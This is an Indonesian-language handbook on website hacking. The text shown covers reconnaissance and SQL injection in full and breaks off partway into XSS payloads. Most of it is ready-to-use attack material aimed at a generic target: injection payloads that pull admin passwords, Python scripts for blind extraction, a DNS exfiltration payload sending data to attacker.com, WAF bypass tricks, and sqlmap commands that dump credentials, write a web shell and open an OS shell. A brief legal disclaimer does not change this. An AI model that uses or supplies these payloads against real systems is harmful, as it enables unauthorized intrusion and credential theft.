# **📚 BUKU PANDUAN WEBSITE HACKING PROFESIONAL: EDISI SPESIFIK & KOMPREHENSIF 2026**
**Semua Teknik, Tools, Script, dan Metodologi Terkini untuk Website Hacking**
**Diperbarui: September 2026**

---

---

## **📋 DAFTAR ISI**

### **BAB 1: PENGENALAN WEBSITE HACKING**
- Apa Itu Website Hacking?
- Jenis-Jenis Website Hacking
- Tahapan Website Hacking
- Etika & Legalitas

---

### **BAB 2: PERSIAPAN & RECONNAISSANCE**
- Setup Lingkungan
- OSINT untuk Website
- Scanning & Enumeration
- Tools Reconnaissance

---
---
### **BAB 3: SQL INJECTION (SQLi) LANJUTAN**
- Pengertian SQL Injection
- Jenis-Jenis SQL Injection
- Deteksi SQL Injection
- Exploitasi SQL Injection
  - Union-Based SQLi
  - Blind SQLi (Boolean-Based)
  - Blind SQLi (Time-Based)
  - Error-Based SQLi
  - Second-Order SQLi
  - Out-of-Band SQLi
- Bypass WAF & SQLi Filter
- Post-Exploitation SQLi
- Automasi dengan SQLMap

---
---
### **BAB 4: CROSS-SITE SCRIPTING (XSS) LANJUTAN**
- Pengertian XSS
- Jenis-Jenis XSS
  - Stored XSS
  - Reflected XSS
  - DOM-Based XSS
- Payload XSS
- XSS untuk Steal Cookie/Session
- XSS untuk Keylogging
- XSS untuk Phishing
- Bypass XSS Filter
- Automasi dengan XSS Hunter

---
---
### **BAB 5: SERVER-SIDE REQUEST FORGERY (SSRF)**
- Pengertian SSRF
- Deteksi SSRF
- Exploitasi SSRF
- SSRF untuk Internal Port Scanning
- SSRF untuk AWS Metadata
- SSRF untuk File Read
- Bypass SSRF Filter

---
---
### **BAB 6: REMOTE CODE EXECUTION (RCE)**
- Pengertian RCE
- Deteksi RCE
- Exploitasi RCE
  - Command Injection
  - File Upload Vulnerability
  - Deserialization RCE
  - Template Injection (SSTI)
- Bypass RCE Filter
- Post-Exploitation RCE

---
---
### **BAB 7: FILE UPLOAD VULNERABILITIES**
- Pengertian File Upload Vulnerability
- Deteksi File Upload Vulnerability
- Exploitasi File Upload
  - Bypass File Extension Filter
  - Bypass MIME Type Filter
  - Bypass File Size Limit
  - Bypass File Content Filter
- Web Shell Upload
- Automasi dengan Burp Suite

---
---
### **BAB 8: AUTHENTICATION ATTACKS**
- Brute Force Attack
- Credential Stuffing
- Password Spraying
- Session Hijacking
  - Session Fixation
  - Session Sidejacking
  - Cookie Theft
- Token Theft
- Bypass Authentication
  - IDOR (Insecure Direct Object Reference)
  - JWT Attacks
  - OAUTH Misconfigurations

---
---
### **BAB 9: INSECURE DIRECT OBJECT REFERENCES (IDOR)**
- Pengertian IDOR
- Deteksi IDOR
- Exploitasi IDOR
- Automasi dengan Burp Suite
- Bypass IDOR Protection

---
---
### **BAB 10: API HACKING**
- Pengertian API Hacking
- Deteksi API Vulnerabilities
- Exploitasi API
  - BOLA (Broken Object Level Authorization)
  - Mass Assignment
  - Excessive Data Exposure
  - Security Misconfigurations
  - Rate Limiting Bypass
- Tools API Hacking
- Automasi dengan Postman & Burp Suite

---
---
### **BAB 11: WEB SHELL & POST-EXPLOITATION**
- Pengertian Web Shell
- Jenis-Jenis Web Shell
- Upload Web Shell
- Post-Exploitation
  - Maintain Access
  - Privilege Escalation
  - Lateral Movement
  - Data Exfiltration
- Web Shell Detection & Evasion

---
---
### **BAB 12: DENIAL OF SERVICE (DoS/DDoS)**
- Pengertian DoS/DDoS
- Jenis-Jenis DoS/DDoS
- Tools DoS/DDoS
- Exploitasi DoS/DDoS
  - SYN Flood
  - UDP Flood
  - HTTP Flood
  - Slowloris
  - Amplification Attacks
- Bypass DoS Protection
- DDoS-as-a-Service (Booter)

---
---
### **BAB 13: WEBSITE DEFACEMENT**
- Pengertian Defacement
- Deteksi Defacement Vulnerability
- Exploitasi Defacement
- Tools Defacement
- Automasi Defacement

---
---
### **BAB 14: TEKNIK LANJUTAN 2026**
- Cloud-Based Attacks
- Serverless Attacks
- Web Cache Poisoning
- HTTP Request Smuggling
- GraphQL Attacks
- WebSocket Attacks
- CORS Misconfigurations
- Subdomain Takeover

---
---
### **BAB 15: BYPASS TEKNIK PERTAHANAN**
- Bypass Firewall
- Bypass WAF
- Bypass Rate Limiting
- Bypass CAPTCHA
- Bypass 2FA

---
---
### **BAB 16: CASE STUDY & REAL-WORLD EXAMPLES**
- Case Study 1: SQL Injection di WordPress
- Case Study 2: XSS di Facebook
- Case Study 3: RCE di Apache Struts
- Case Study 4: API Hacking di Twitter
- Case Study 5: DoS Attack di Cloudflare

---
---
### **BAB 17: TOOLS WEBSITE HACKING**
- Tools Reconnaissance
- Tools Vulnerability Scanning
- Tools Exploitation
- Tools Post-Exploitation
- Tools Automasi

---
---
### **BAB 18: DISCLAIMER & ETIKA**

---

---
---
---

## **🔹 BAB 1: PENGENALAN WEBSITE HACKING**

---

### **Apa Itu Website Hacking?**
Website Hacking adalah **proses mengeksploitasi kerentanan (vulnerabilities) dalam sebuah website** untuk mendapatkan akses tidak sah, mencuri data, memodifikasi konten, atau mengganggu layanan. Website hacking bisa dilakukan untuk berbagai tujuan, baik **legal** (seperti penetration testing) maupun **ilegal** (seperti pencurian data).

---

### **Jenis-Jenis Website Hacking**
| Jenis | Deskripsi | Contoh |
|-------|-----------|--------|
| **SQL Injection (SQLi)** | Menyuntikkan perintah SQL ke input website untuk mengakses database | `' OR '1'='1` |
| **Cross-Site Scripting (XSS)** | Menyuntikkan script JavaScript ke website untuk mengeksekusi kode di browser korban | `<script>alert('XSS')</script>` |
| **Remote Code Execution (RCE)** | Mengeksekusi kode arbitrari di server | `; id; #` (Command Injection) |
| **File Upload Vulnerability** | Upload file berbahaya (malware, web shell) ke server | `.php` shell upload |
| **Authentication Attacks** | Serangan terhadap mekanisme autentikasi (brute force, session hijacking) | Hydra, Cookie Theft |
| **Server-Side Request Forgery (SSRF)** | Memaksa server untuk membuat request ke internal network | `http://localhost/admin` |
| **Denial of Service (DoS/DDoS)** | Mengganggu layanan website hingga tidak bisa diakses | SYN Flood, HTTP Flood |
| **Insecure Direct Object Reference (IDOR)** | Mengakses data milik user lain dengan mengubah parameter | `/user?id=123` → `/user?id=124` |
| **API Hacking** | Mengeksploitasi kerentanan dalam API | BOLA, Mass Assignment |
| **Website Defacement** | Mengganti konten website dengan pesan attacker | Hacktivism |

---

### **Tahapan Website Hacking**
1. **Reconnaissance (OSINT)**
   - Mengumpulkan informasi tentang target (domain, IP, subdomain, tech stack, dll).
2. **Scanning & Enumeration**
   - Mendeteksi port terbuka, service, dan kerentanan.
3. **Vulnerability Assessment**
   - Mencari kerentanan yang bisa dieksploitasi.
4. **Exploitation**
   - Mengeksploitasi kerentanan untuk mendapatkan akses.
5. **Post-Exploitation**
   - Mempertahankan akses, escalate privilege, mencuri data, dll.
6. **Covering Tracks**
   - Menghapus jejak dan menghindari deteksi.

---

### **Etika & Legalitas**
✅ **Legal (Dengan Izin):**
- **Penetration Testing** (dengan kontrak resmi).
- **Bug Bounty** (lapor vulnerability ke vendor).
- **Security Research** (di lab terisolasi).
- **CTF & Lab Pribadi** (latihan di VM vulnerable).

❌ **Ilegal (Tanpa Izin):**
- **Unauthorized Access** → **UU ITE Pasal 30** (6 tahun penjara).
- **Modifying/Deleting Data** → **UU ITE Pasal 32** (7 tahun penjara).
- **DoS/DDoS Attack** → **UU ITE Pasal 33** (10 tahun penjara).
- **Phishing & Session Hijacking** → **Penipuan (Pasal 378 KUHP)**.

---
---
---

## **🔹 BAB 2: PERSIAPAN & RECONNAISSANCE**

---

### **Setup Lingkungan**
Untuk website hacking, Anda memerlukan:
1. **Kali Linux** (OS utama untuk tools).
2. **Termux** (Android, untuk tools dasar).
3. **Virtual Machine** (untuk latihan legal).
4. **VPS** (untuk hosting C2, phishing, dll).

---
#### **📌 Setup Kali Linux**
```bash
# Update system
sudo apt update && sudo apt full-upgrade -y

# Install tools website hacking
sudo apt install -y nmap nikto dirb gobuster sqlmap burpsuite owasp-zap wireshark hydra john hashcat metasploit-framework

# Install tools tambahan
sudo apt install -y curl wget git python3 python3-pip php
```

---
#### **📌 Setup Termux**
```bash
pkg update && pkg upgrade -y
pkg install nmap curl wget git python php openssh -y
```

---
### **OSINT untuk Website**
OSINT (Open Source Intelligence) adalah **pengumpulan informasi dari sumber publik** sebelum melakukan serangan.

---
#### **📌 WHOIS Lookup**
```bash
# Cek informasi domain
whois target.com

# Cek informasi IP
whois 192.168.1.100
```

**Output:**
```
Domain Name: TARGET.COM
Registry Domain ID: 123456789_DOMAIN_COM-VRSN
Registrar: NAMECHEAP INC
Registrar IANA ID: 1068
Domain Status: ok
Registry Registrant ID: REDACTED
Registrant Name: REDACTED
Registrant Organization: Target Corp
Registrant Email: admin@target.com
```

---
#### **📌 DNS Enumeration**
```bash
# DNS lookup
dig target.com ANY

# Reverse DNS lookup
dig -x 192.168.1.100

# Subdomain enumeration
sublist3r -d target.com
amass enum -d target.com -o subdomains.txt

# DNS brute force
dnsrecon -d target.com -t brt -D /usr/share/dnsrecon/namelist.txt
```

**Output:**
```
subdomains.txt:
mail.target.com
api.target.com
admin.target.com
dev.target.com
```

---
#### **📌 HTTP Header Analysis**
```bash
# Cek HTTP headers
curl -I http://target.com

# Atau gunakan whatweb
whatweb target.com
```

**Output:**
```
HTTP/1.1 200 OK
Server: Apache/2.4.29 (Ubuntu)
X-Powered-By: PHP/7.4.3
Set-Cookie: PHPSESSID=abc123; path=/
```

---
#### **📌 Technology Stack Detection**
```bash
# Gunakan Wappalyzer (browser extension)
# Atau gunakan whatweb
whatweb -v target.com

# Atau gunakan builtwith
builtwith target.com
```

**Output:**
```
Technologies:
- Apache 2.4.29
- PHP 7.4.3
- MySQL
- jQuery 3.5.1
```

---
#### **📌 Wayback Machine (Archive.org)**
```bash
# Cek versi lama website
curl -s "http://web.archive.org/cdx/search/cdx?url=target.com/*&output=json" | jq
```

**Output:**
```
[
  ["target.com","/","20230101000000","http://target.com","200","L3V2QYQ5QJQ5QJQ5QJQ5QJQ5QJQ5-","text/html","6.2.1.1","PHP/7.4.3","Mozilla/5.0"],
  ["target.com","/admin","20230102000000","http://target.com/admin","403","-","text/html","6.2.1.1","PHP/7.4.3","Mozilla/5.0"]
]
```

---
#### **📌 GitHub Dorking**
```bash
# Cari repository yang terkait dengan target
site:github.com target.com

# Cari credentials yang ter-expose
site:github.com "password" "target.com"
site:github.com "api_key" "target.com"
```

---
#### **📌 Shodan & Censys**
```bash
# Install Shodan CLI
pip install shodan

# Login
shodan init YOUR_API_KEY

# Search target
shodan host target.com
shodan search "target.com" --fields ip,port,org,hostnames
```

**Output:**
```
192.168.1.100
Ports: 80 (HTTP), 443 (HTTPS), 22 (SSH)
Organization: Target Corp
Hostnames: target.com, mail.target.com
```

---
### **Scanning & Enumeration**
Setelah OSINT, langkah selanjutnya adalah **scanning** untuk menemukan kerentanan.

---
#### **📌 Port Scanning (Nmap)**
```bash
# Basic scan
nmap -sV target.com

# Aggressive scan (OS, version, script)
nmap -A target.com

# Scan semua port (1-65535)
nmap -p- target.com

# Scan dengan script vulnerability
nmap --script vuln target.com

# Scan dengan service detection
nmap -sV -sC target.com
```

**Output:**
```
Starting Nmap 7.92 ( https://nmap.org )
Nmap scan report for target.com (192.168.1.100)
Host is up (0.045s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE    VERSION
22/tcp  open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http       Apache httpd 2.4.29 ((Ubuntu))
443/tcp open  ssl/http   Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:canonical:ubuntu_linux:20.04
```

---
#### **📌 Directory Brute Force**
```bash
# Gobuster
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# Dirb
dirb http://target.com /usr/share/wordlists/dirb/common.txt

# FFUF (lebih cepat)
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

**Output:**
```
200      GET      6l       /admin
200      GET      123      /login
200      GET      456      /wp-admin
403      GET      12       /backup
```

---
#### **📌 Subdomain Brute Force**
```bash
# Sublist3r + Amass
sublist3r -d target.com -o subdomains.txt
amass enum -d target.com -o subdomains_amass.txt

# Gabungkan hasil
cat subdomains.txt subdomains_amass.txt | sort -u > all_subdomains.txt

# Scan subdomains
nmap -iL all_subdomains.txt -p 80,443 --open
```

---
#### **📌 CMS Detection**
```bash
# WordPress
whatweb target.com | grep -i wordpress

# Joomla
whatweb target.com | grep -i joomla

# Drupal
whatweb target.com | grep -i drupal

# Atau gunakan WPScan (untuk WordPress)
wpscan --url target.com
```

**Output:**
```
WordPress version 5.8.2
Theme: Divi
Plugins: WooCommerce, Contact Form 7
```

---
### **Tools Reconnaissance**
| Tool | Fungsi | Install | Usage |
|------|--------|---------|-------|
| **Nmap** | Port scanning, service detection | `apt install nmap` | `nmap -sV -sC target.com` |
| **theHarvester** | Email/username harvesting | `apt install theharvester` | `theHarvester -d target.com -b all` |
| **Sublist3r** | Subdomain enumeration | `apt install sublist3r` | `sublist3r -d target.com` |
| **Amass** | Advanced subdomain enumeration | `apt install amass` | `amass enum -d target.com` |
| **WhatWeb** | Technology detection | `apt install whatweb` | `whatweb target.com` |
| **Wappalyzer** | Technology detection (browser) | - | - |
| **Shodan** | Internet-wide scanning | `pip install shodan` | `shodan search target.com` |
| **Censys** | Internet-wide scanning | `pip install censys` | `censys search "target.com"` |
| **BuiltWith** | Technology detection | - | `builtwith target.com` |
| **Wayback Machine** | Historical website data | - | `curl -s "http://web.archive.org/cdx/search/cdx?url=target.com/*"` |

---
---
---

## **🔹 BAB 3: SQL INJECTION (SQLi) LANJUTAN**

---

### **Pengertian SQL Injection**
SQL Injection (SQLi) adalah **kerentanan yang memungkinkan attacker untuk menyuntikkan perintah SQL ke dalam query database**. Hal ini terjadi karena **input user tidak divalidasi/escaped** dengan benar sebelum digunakan dalam query.

**Contoh Query Rentan:**
```sql
-- PHP + MySQL
$query = "SELECT * FROM users WHERE username = '" . $_POST['username'] . "' AND password = '" . $_POST['password'] . "'";
```
Jika user memasukkan `admin' --`, query menjadi:
```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = ''
```
→ **Login sebagai admin tanpa password!**

---

### **Jenis-Jenis SQL Injection**
| Jenis | Deskripsi | Contoh |
|-------|-----------|--------|
| **Union-Based** | Menggunakan `UNION` untuk menggabungkan data dari tabel lain | `' UNION SELECT 1,2,3 --` |
| **Blind (Boolean-Based)** | Menggunakan kondisi boolean untuk menebak data | `' AND 1=1 --` |
| **Blind (Time-Based)** | Menggunakan `SLEEP()` untuk menebak data | `' AND IF(SUBSTRING(password,1,1)='a',SLEEP(5),0) --` |
| **Error-Based** | Memanfaatkan error message untuk extract data | `' AND EXTRACTVALUE(1,CONCAT(0x5C,(SELECT USER()),0x5C)) --` |
| **Second-Order** | Input disimpan terlebih dahulu, kemudian digunakan dalam query | Input: `admin'--` → Disimpan → Digunakan dalam query |
| **Out-of-Band** | Memanfaatkan fitur eksternal (DNS, HTTP) untuk extract data | `' AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT USER()),'.attacker.com\\share\\'))) --` |

---

### **Deteksi SQL Injection**
---
#### **📌 Manual Detection**
Coba input berikut di **semua parameter** (URL, form, header, dll):

| Input | Deskripsi | Expected Behavior |
|-------|-----------|-------------------|
| `' OR '1'='1` | Classic SQLi | Login tanpa password, atau error SQL |
| `' OR 1=1 --` | SQLi dengan komentar | Sama seperti di atas |
| `' OR 1=1 #` | SQLi dengan komentar (MySQL) | Sama seperti di atas |
| `' OR 1=1 /*` | SQLi dengan komentar (multi-line) | Sama seperti di atas |
| `admin' --` | Bypass login | Login sebagai admin |
| `1' ORDER BY 1--+` | Deteksi jumlah kolom | Error atau output normal |
| `1' ORDER BY 10--+` | Deteksi jumlah kolom | Error (jika kolom < 10) |
| `1' UNION SELECT 1,2,3--+` | Deteksi UNION | Error atau output "1,2,3" |
| `' AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables)) --` | Error-based | Error dengan nama tabel |

---
#### **📌 Automated Detection (SQLMap)**
```bash
# Basic scan
sqlmap -u "http://target.com/page.php?id=1" --batch

# Detect SQLi + get DB info
sqlmap -u "http://target.com/page.php?id=1" --dbs --batch

# Get tables
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables --batch

# Get columns
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --columns --batch

# Dump data
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users -C username,password --dump --batch
```

---
### **Exploitasi SQL Injection**
---
#### **📌 Union-Based SQLi**
**Tujuan:** Extract data dari database menggunakan `UNION`.

**Langkah:**
1. **Deteksi jumlah kolom** dengan `ORDER BY`:
   ```
   http://target.com/page.php?id=1' ORDER BY 1--+
   http://target.com/page.php?id=1' ORDER BY 2--+
   ...
   http://target.com/page.php?id=1' ORDER BY 10--+  # Error → kolom < 10
   ```
2. **Gunakan UNION** untuk extract data:
   ```
   http://target.com/page.php?id=1' UNION SELECT 1,2,3--+
   ```
   - Jika output menampilkan `1,2,3` → **vulnerable**.
3. **Ganti nilai dengan data yang diinginkan**:
   ```sql
   ' UNION SELECT 1,username,password FROM users--
   ```
   → Output: `1, admin, password123`

**Contoh Lengkap:**
```
http://target.com/page.php?id=1' UNION SELECT 1,username,password FROM users WHERE username='admin'--
```

---
#### **📌 Blind SQLi (Boolean-Based)**
**Tujuan:** Menebak data **tanpa output langsung** (hanya true/false).

**Contoh:**
```
http://target.com/page.php?id=1 AND 1=1
```
- Jika halaman **normal** → **True**.
- Jika halaman **error/kosong** → **False**.

**Extract Data:**
```
http://target.com/page.php?id=1 AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'
```
- Jika **True** → karakter pertama password adalah `'a'`.
- Jika **False** → coba `'b'`, `'c'`, dst.

**Automasi dengan Python:**
```python
import requests

url = "http://target.com/page.php?id=1"
password = ""
chars = "abcdefghijklmnopqrstuvwxyz0123456789"

for i in range(1, 10):  # Tebak 10 karakter
    for c in chars:
        test = f" AND SUBSTRING((SELECT password FROM users WHERE username='admin'),{i},1)='{c}'"
        r = requests.get(f"{url}{test}")
        if "Welcome" in r.text:  # Atau cek apakah response normal
            password += c
            print(f"Password: {password}")
            break
```

---
#### **📌 Blind SQLi (Time-Based)**
**Tujuan:** Menebak data dengan **delay** (jika benar, response lambat).

**Contoh (MySQL):**
```
http://target.com/page.php?id=1 AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a',SLEEP(5),0)
```
- Jika response **lambat 5 detik** → karakter pertama password adalah `'a'`.

**Automasi dengan Python:**
```python
import requests
import time

url = "http://target.com/page.php?id=1"
password = ""
chars = "abcdefghijklmnopqrstuvwxyz0123456789"

for i in range(1, 10):
    for c in chars:
        test = f" AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),{i},1)='{c}',SLEEP(2),0)"
        start = time.time()
        r = requests.get(f"{url}{test}")
        elapsed = time.time() - start
        if elapsed >= 2:  # Jika lambat
            password += c
            print(f"Password: {password}")
            break
```

---
#### **📌 Error-Based SQLi**
**Tujuan:** Memanfaatkan **error message** untuk extract data.

**Contoh (MySQL):**
```
http://target.com/page.php?id=1 AND EXTRACTVALUE(1,CONCAT(0x5C,(SELECT password FROM users WHERE username='admin'),0x5C))
```
- **Output Error:**
  ```
  ERROR 1105 (HY000): XPATH syntax error: 'password123'
  ```
  → Password adalah `password123`.

**Contoh (MSSQL):**
```
http://target.com/page.php?id=1 AND 1=CONVERT(int,(SELECT password FROM users WHERE username='admin'))
```
- **Output Error:**
  ```
  Error converting data type varchar to int: password123
  ```

---
#### **📌 Second-Order SQLi**
**Tujuan:** Input **disimpan terlebih dahulu** (database, file, dll), kemudian digunakan dalam query.

**Contoh:**
1. **Input:** `admin'--` di form registrasi → disimpan di database.
2. **Query:** `SELECT * FROM users WHERE username = '$input'` → `SELECT * FROM users WHERE username = 'admin'--'`
   → **Login sebagai admin tanpa password**.

**Deteksi:**
- Coba input `' OR 1=1 --` di form yang menyimpan data (registrasi, search, dll).
- Lalu cek apakah input digunakan dalam query lain.

---
#### **📌 Out-of-Band SQLi**
**Tujuan:** Memanfaatkan fitur eksternal (DNS, HTTP) untuk extract data **tanpa output langsung**.

**Contoh (DNS Exfiltration - MySQL):**
```
http://target.com/page.php?id=1 AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users WHERE username='admin'),'.attacker.com\\share\\')))
```
- Jika password adalah `abc123`, MySQL akan coba load file dari `\\abc123.attacker.com\share\`.
- **Attacker memonitor DNS request** ke `abc123.attacker.com` → **password terungkap!**

**Tools:**
- **DNSExfiltrator** (untuk MySQL, PostgreSQL, MSSQL).
- **Burp Collaborator** (untuk HTTP-based exfiltration).

---
### **Bypass WAF & SQLi Filter**
WAF (Web Application Firewall) dan filter SQLi seringkali **memblokir input mencurigakan** (seperti `'`, `"`, `UNION`, `SELECT`, dll). Berikut cara **bypass**:

---
#### **📌 Bypass dengan Encoding**
| Encoding | Contoh | Deskripsi |
|----------|--------|-----------|
| **URL Encoding** | `%27` | `'` |
| **Double URL Encoding** | `%2527` | `%27` (URL encode lagi) |
| **Hex Encoding** | `0x27` | `'` |
| **Unicode Encoding** | `\u0027` | `'` |
| **HTML Encoding** | `&#39;` | `'` |

**Contoh:**
```
http://target.com/page.php?id=1%27%20OR%201=1--+
```
→ `1' OR 1=1--+`

---
#### **📌 Bypass dengan Komentar**
| Database | Komentar |
|----------|----------|
| MySQL | `#`, `-- `, `/* */` |
| PostgreSQL | `--`, `/* */` |
| MSSQL | `--`, `/* */` |
| Oracle | `--`, `/* */` |

**Contoh:**
```
http://target.com/page.php?id=1'/*!50000OR*/1=1--+
```
→ MySQL akan **mengabaikan komentar** dan menjalankan `OR 1=1`.

---
#### **📌 Bypass dengan Case Variation**
```sql
SeLeCt * FrOm users WhErE username = 'admin'
```
- Beberapa WAF **case-sensitive**, jadi `SELECT` diblokir, tapi `SeLeCt` tidak.

---
#### **📌 Bypass dengan String Concatenation**
```sql
' OR '1'='1'  →  CONCAT(' OR ', '1', '=', '1')
```
**Contoh:**
```
http://target.com/page.php?id=1' OR CONCAT('1','=','1')--
```

---
#### **📌 Bypass dengan Tamper Scripts (SQLMap)**
SQLMap memiliki **tamper scripts** untuk bypass WAF:
```bash
# List tamper scripts
sqlmap --list-tamper

# Gunakan tamper script
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment --batch
```

**Tamper Scripts Populer:**
| Script | Deskripsi |
|--------|-----------|
| `space2comment` | Ganti spasi dengan komentar (`/**/`) |
| `randomcase` | Randomize case keyword (`SeLeCt`) |
| `between` | Ganti `>` dengan `BETWEEN` |
| `chardoubleencode` | Double URL encoding |
| `charencode` | Encode karakter dengan `%HH` |
| `equaltolike` | Ganti `=` dengan `LIKE` |
| `greatest` | Ganti `>` dengan `GREATEST` |
| `ifnull2ifisnull` | Ganti `IFNULL` dengan `IF(ISNULL(...))` |

---
#### **📌 Bypass dengan HTTP Parameter Pollution (HPP)**
**Konsep:** Mengirim **parameter ganda** untuk membingungkan WAF.

**Contoh:**
```
http://target.com/page.php?id=1&id=' OR 1=1--
```
- Beberapa WAF **hanya memeriksa parameter pertama** (`id=1`), sementara backend menggunakan **parameter terakhir** (`id=' OR 1=1--`).

---
#### **📌 Bypass dengan Null Byte (%00)**
**Konsep:** Beberapa backend **mengabaikan input setelah null byte** (`%00`).

**Contoh:**
```
http://target.com/page.php?id=1'%00 OR 1=1--
```
- WAF melihat: `id=1'`
- Backend melihat: `id=1' OR 1=1--`

---
### **Post-Exploitation SQLi**
Setelah berhasil **inject SQL**, langkah selanjutnya adalah **post-exploitation**:

---
#### **📌 Extract Database Information**
```bash
# Get database name
sqlmap -u "http://target.com/page.php?id=1" --current-db --batch

# Get tables
sqlmap -u "http://target.com/page.php?id=1" --tables -D database_name --batch

# Get columns
sqlmap -u "http://target.com/page.php?id=1" --columns -D database_name -T users --batch

# Dump data
sqlmap -u "http://target.com/page.php?id=1" --dump -D database_name -T users --batch
```

---
#### **📌 Get Database Users & Passwords**
```bash
# MySQL
sqlmap -u "http://target.com/page.php?id=1" --dump -D mysql -T user --batch

# PostgreSQL
sqlmap -u "http://target.com/page.php?id=1" --dump -D postgres -T pg_user --batch

# MSSQL
sqlmap -u "http://target.com/page.php?id=1" --dump -D master -T syslogins --batch
```

---
#### **📌 Read/Write Files (File System Access)**
Jika database **MySQL/MariaDB** dan user punya **privilege FILE**, Anda bisa **baca/tulis file**:
```bash
# Read file (MySQL)
sqlmap -u "http://target.com/page.php?id=1" --file-read "/etc/passwd" --batch

# Write file (MySQL)
sqlmap -u "http://target.com/page.php?id=1" --file-write "/var/www/html/shell.php" --file-dest "/var/www/html/shell.php" --batch
```

---
#### **📌 Execute OS Commands**
Jika database **MySQL/MariaDB** dan user punya **privilege PROCESS**, Anda bisa **eksekusi perintah OS**:
```bash
# Execute command (MySQL)
sqlmap -u "http://target.com/page.php?id=1" --os-cmd "id" --batch

# Get reverse shell
sqlmap -u "http://target.com/page.php?id=1" --os-shell --batch
```

---
#### **📌 Get Database Schema**
```bash
# Get all databases
sqlmap -u "http://target.com/page.php?id=1" --dbs --batch

# Get all tables in a database
sqlmap -u "http://target.com/page.php?id=1" --tables -D database_name --batch

# Get all columns in a table
sqlmap -u "http://target.com/page.php?id=1" --columns -D database_name -T table_name --batch
```

---
### **Automasi dengan SQLMap**
SQLMap adalah **tool otomatis** untuk deteksi dan exploitasi SQLi.

---
#### **📌 Basic Commands**
| Command | Deskripsi |
|---------|-----------|
| `sqlmap -u "URL" --batch` | Deteksi SQLi otomatis |
| `sqlmap -u "URL" --dbs` | Dapatkan daftar database |
| `sqlmap -u "URL" -D db --tables` | Dapatkan daftar tabel di database |
| `sqlmap -u "URL" -D db -T table --columns` | Dapatkan daftar kolom di tabel |
| `sqlmap -u "URL" -D db -T table -C column --dump` | Dump data dari kolom |
| `sqlmap -u "URL" --dump-all` | Dump semua data |
| `sqlmap -u "URL" --os-shell` | Dapatkan OS shell |
| `sqlmap -u "URL" --file-read "/etc/passwd"` | Baca file |
| `sqlmap -u "URL" --file-write "shell.php" --file-dest "/var/www/html/shell.php"` | Tulis file |
| `sqlmap -u "URL" --tamper=space2comment` | Gunakan tamper script |

---
#### **📌 Advanced Commands**
```bash
# Scan semua subdomain
sqlmap -l subdomains.txt --batch

# Scan dengan cookie
sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abc123" --batch

# Scan dengan user-agent
sqlmap -u "http://target.com/page.php?id=1" --user-agent="Mozilla/5.0" --batch

# Scan dengan proxy
sqlmap -u "http://target.com/page.php?id=1" --proxy="http://127.0.0.1:8080" --batch

# Scan dengan delay (bypass rate limiting)
sqlmap -u "http://target.com/page.php?id=1" --delay=2 --batch

# Scan dengan random user-agent
sqlmap -u "http://target.com/page.php?id=1" --random-agent --batch

# Scan dengan level & risk tinggi
sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3 --batch
```

---
#### **📌 SQLMap Tamper Scripts**
| Tamper Script | Deskripsi | Contoh Input |
|---------------|-----------|---------------|
| `space2comment` | Ganti spasi dengan `/**/` | `1 /**/OR/**/ 1=1` |
| `randomcase` | Randomize case | `sElEcT * fRoM uSeRs` |
| `between` | Ganti `>` dengan `BETWEEN` | `1 BETWEEN 0 AND 1` |
| `chardoubleencode` | Double URL encode | `%2527%20OR%201%3D1` |
| `charencode` | Encode karakter | `%27%20OR%201%3D1` |
| `equaltolike` | Ganti `=` dengan `LIKE` | `1 LIKE 1` |
| `greatest` | Ganti `>` dengan `GREATEST` | `GREATEST(1,0)=1` |
| `ifnull2ifisnull` | Ganti `IFNULL` dengan `IF(ISNULL(...))` | `IF(ISNULL(1),1,0)` |

---
---
---

## **🔹 BAB 4: CROSS-SITE SCRIPTING (XSS) LANJUTAN**

---

### **Pengertian XSS**
Cross-Site Scripting (XSS) adalah **kerentanan yang memungkinkan attacker untuk menyuntikkan script JavaScript ke dalam website**, yang kemudian **dieksekusi di browser korban**. Hal ini terjadi karena **input user tidak divalidasi/escaped** dengan benar sebelum ditampilkan.

**Contoh Rentan:**
```html
<!-- PHP -->
<input type="text" name="search" value="<?php echo $_GET['q']; ?>">
```
Jika user memasukkan `<script>alert('XSS')</script>`, output menjadi:
```html
<input type="text" name="search" value="<script>alert('XSS')</script>">
```
→ **Script dieksekusi di browser korban!**

---

### **Jenis-Jenis XSS**
| Jenis | Deskripsi | Contoh | Persistence |
|-------|-----------|--------|-------------|
| **Stored XSS** | Script disimpan di database/server (contoh: komentar, post) | `<script>alert('XSS')</script>` di komentar | **Permanen** |
| **Reflected XSS** | Script tercermin di response (contoh: search, error page) | `<script>alert('XSS')</script>` di URL | **Temporary** |
| **DOM-Based XSS** | Script dieksekusi di DOM (tanpa server-side) | `document.write('<img src=x onerror=alert(1)>')` | **Temporary** |

---

### **Payload XSS**
Berikut adalah **payload XSS** yang bisa digunakan untuk berbagai tujuan:

---
#### **📌 Basic XSS Payloads**
| Payload | Deskripsi |
|---------|-----------|
| `<script>alert('XSS')</script>` | Pop-up sederhana |
| `<img src=x onerror=alert('XSS')>` | XSS dengan tag `<img>` |
| `<svg onload=alert('XSS')>` | XSS dengan SVG |
| `<body onscroll=alert('XSS')>` | XSS dengan event `onscroll` |
| `<iframe src="javascript:alert('XSS')">` | XSS dengan iframe |
| `<a href="javascript:alert('XSS')">Click Me</a>` | XSS dengan link |
| `<input type="text" onfocus=alert('XSS') autofocus>` | XSS dengan `onfocus` |
| `<details/open/ontoggle=alert('XSS')>` | XSS dengan `<details>` |

---
#### **📌 XSS untuk Keylogging**
**Payload:**
```html
<script>
